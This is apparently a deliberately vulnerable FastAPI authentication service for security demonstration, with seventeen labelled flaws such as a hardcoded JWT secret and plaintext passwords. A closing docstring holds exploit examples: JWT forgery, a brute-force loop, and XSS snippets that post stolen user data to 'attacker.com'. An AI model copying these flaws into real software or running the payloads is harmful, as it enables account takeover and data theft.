from fastapi import FastAPI, HTTPException, Depends, Request, Response
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel, EmailStr
from datetime import datetime, timedelta
from typing import Optional
import jwt as PyJWT
import os
from shared.auth import (
    create_access_token, create_refresh_token, verify_token,
    ALGORITHM, USERS, USER_PASSWORDS,
    verify_password, get_current_user, User, UserCreate, get_password_hash
)
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

# VULNERABILITY 1: Weak secret key
# Using a predictable, hardcoded secret key
SECRET_KEY = "super-secret-key-123"

# VULNERABILITY 2: Long token expiration
# Tokens valid for a very long time
ACCESS_TOKEN_EXPIRE_MINUTES = 10080  # 7 days
REFRESH_TOKEN_EXPIRE_DAYS = 365      # 1 year

# VULNERABILITY 3: Using weak algorithm
JWT_ALGORITHM = "HS256"  # Using weaker algorithm

app = FastAPI(
    title="Insecure Auth Service",
    description="Intentionally vulnerable authentication service for demonstration",
    version="1.0.0"
)

# VULNERABILITY 4: No rate limiting
# Removed rate limiting to allow brute force attacks
limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# VULNERABILITY 5: Permissive CORS
# Allowing all origins and methods
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allow all origins
    allow_credentials=True,
    allow_methods=["*"],  # Allow all methods
    allow_headers=["*"],  # Allow all headers
)

class Token(BaseModel):
    access_token: str
    refresh_token: str
    token_type: str

class TokenData(BaseModel):
    username: Optional[str] = None

# VULNERABILITY 6: No token type validation
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

@app.post("/token")
async def login(request: Request, form_data: OAuth2PasswordRequestForm = Depends()):
    """
    Vulnerable login endpoint with:
    - No rate limiting
    - Weak password validation
    - Long-lived tokens
    - No token type validation
    """
    # VULNERABILITY 7: Timing attack vulnerability in password check
    if form_data.username not in USERS:
        raise HTTPException(
            status_code=401,
            detail="Incorrect username or password"
        )
    
    # VULNERABILITY 8: No proper password verification
    if form_data.password != USER_PASSWORDS[form_data.username]:  # Direct comparison
        raise HTTPException(
            status_code=401,
            detail="Incorrect username or password"
        )
    
    # VULNERABILITY 9: No account status checking
    user = USERS[form_data.username]
    
    # VULNERABILITY 10: Including sensitive data in token
    access_token = create_access_token(
        data={
            "sub": form_data.username,
            "role": user.role,
            "email": user.email,
            "is_admin": user.role == "admin"
        },
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    refresh_token = create_refresh_token(
        data={
            "sub": form_data.username,
            "role": user.role,
            "email": user.email,
            "is_admin": user.role == "admin"
        },
        expires_delta=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    )
    
    return {
        "access_token": access_token,
        "refresh_token": refresh_token,
        "token_type": "bearer"
    }

@app.post("/refresh")
async def refresh_token(request: Request, refresh_token: str):
    """
    Vulnerable token refresh endpoint with:
    - No rate limiting
    - No token type validation
    - No user existence verification
    """
    try:
        # VULNERABILITY 11: No token type validation
        payload = verify_token(refresh_token)
        
        # VULNERABILITY 12: No user existence check
        username = payload.get("sub")
        
        # VULNERABILITY 13: Including sensitive data in new tokens
        access_token = create_access_token(
            data={
                "sub": username,
                "role": payload.get("role"),
                "email": payload.get("email"),
                "is_admin": payload.get("is_admin")
            },
            expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
        )
        new_refresh_token = create_refresh_token(
            data={
                "sub": username,
                "role": payload.get("role"),
                "email": payload.get("email"),
                "is_admin": payload.get("is_admin")
            },
            expires_delta=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
        )
        
        return {
            "access_token": access_token,
            "refresh_token": new_refresh_token,
            "token_type": "bearer"
        }
    except PyJWT.InvalidTokenError:
        raise HTTPException(
            status_code=401,
            detail="Invalid refresh token"
        )

@app.get("/users/me")
async def read_users_me(request: Request, user: User = Depends(get_current_user)):
    """
    Vulnerable user info endpoint with:
    - No rate limiting
    - No proper token validation
    """
    return user

@app.post("/logout")
async def logout(request: Request, response: Response):
    """
    Vulnerable logout endpoint with:
    - No token invalidation
    - No proper session management
    """
    return {"message": "Successfully logged out"}

@app.post("/register")
async def register(request: Request, user_data: UserCreate):
    """
    Vulnerable registration endpoint with:
    - No rate limiting
    - No input validation
    - No password complexity requirements
    """
    if user_data.username in USERS:
        raise HTTPException(
            status_code=400,
            detail="Username already registered"
        )
    
    # VULNERABILITY 14: No password complexity check
    new_user = User(
        username=user_data.username,
        email=user_data.email,
        role=user_data.role,
        disabled=False
    )
    
    # VULNERABILITY 15: Storing plain text passwords
    USERS[user_data.username] = new_user
    USER_PASSWORDS[user_data.username] = user_data.password  # No hashing
    
    # VULNERABILITY 16: Including sensitive data in tokens
    access_token = create_access_token(
        data={
            "sub": user_data.username,
            "role": user_data.role,
            "email": user_data.email,
            "is_admin": user_data.role == "admin"
        },
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    refresh_token = create_refresh_token(
        data={
            "sub": user_data.username,
            "role": user_data.role,
            "email": user_data.email,
            "is_admin": user_data.role == "admin"
        },
        expires_delta=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    )
    
    return {
        "access_token": access_token,
        "refresh_token": refresh_token,
        "token_type": "bearer",
        "message": f"Successfully registered as {user_data.role}"
    }

if __name__ == "__main__":
    import uvicorn
    # VULNERABILITY 17: No SSL/TLS
    uvicorn.run(app, host="0.0.0.0", port=8003)

"""
EXPLOIT EXAMPLES:

1. JWT Token Manipulation:
   - Decode the JWT token using jwt.io
   - Modify the payload to change role to "admin"
   - Re-sign using the weak secret key "super-secret-key-123"
   
   Example using Python:
   ```python
   import jwt
   
   # Original token
   token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
   
   # Decode token
   payload = jwt.decode(token, "super-secret-key-123", algorithms=["HS256"])
   
   # Modify payload
   payload["role"] = "admin"
   payload["is_admin"] = True
   
   # Create new token
   new_token = jwt.encode(payload, "super-secret-key-123", algorithm="HS256")
   ```

2. Brute Force Attack:
   - No rate limiting allows unlimited login attempts
   - Weak password storage allows easy password cracking
   
   Example using Python:
   ```python
   import requests
   
   def brute_force(username):
       passwords = ["password", "123456", "admin", ...]  # Common passwords
       for password in passwords:
           response = requests.post(
               "http://localhost:8003/token",
               data={"username": username, "password": password}
           )
           if response.status_code == 200:
               print(f"Found password: {password}")
               return response.json()["access_token"]
   ```

3. CORS Exploitation:
   - Permissive CORS allows any origin to make requests
   - Can be used to steal tokens via XSS
   
   Example using JavaScript:
   ```javascript
   fetch("http://localhost:8003/users/me", {
       credentials: "include",
       headers: {
           "Authorization": "Bearer " + stolen_token
       }
   }).then(r => r.json()).then(data => {
       // Send stolen data to attacker's server
       fetch("https://attacker.com/steal", {
           method: "POST",
           body: JSON.stringify(data)
       });
   });
   ```

4. Token Theft via XSS:
   - Sensitive data in tokens makes them valuable targets
   - Long token lifetime means stolen tokens remain valid
   
   Example XSS payload:
   ```html
   <script>
   fetch("http://localhost:8003/users/me", {
       headers: {
           "Authorization": "Bearer " + document.cookie.split("token=")[1]
       }
   }).then(r => r.json()).then(data => {
       fetch("https://attacker.com/steal", {
           method: "POST",
           body: JSON.stringify(data)
       });
   });
   </script>
   ```
""" 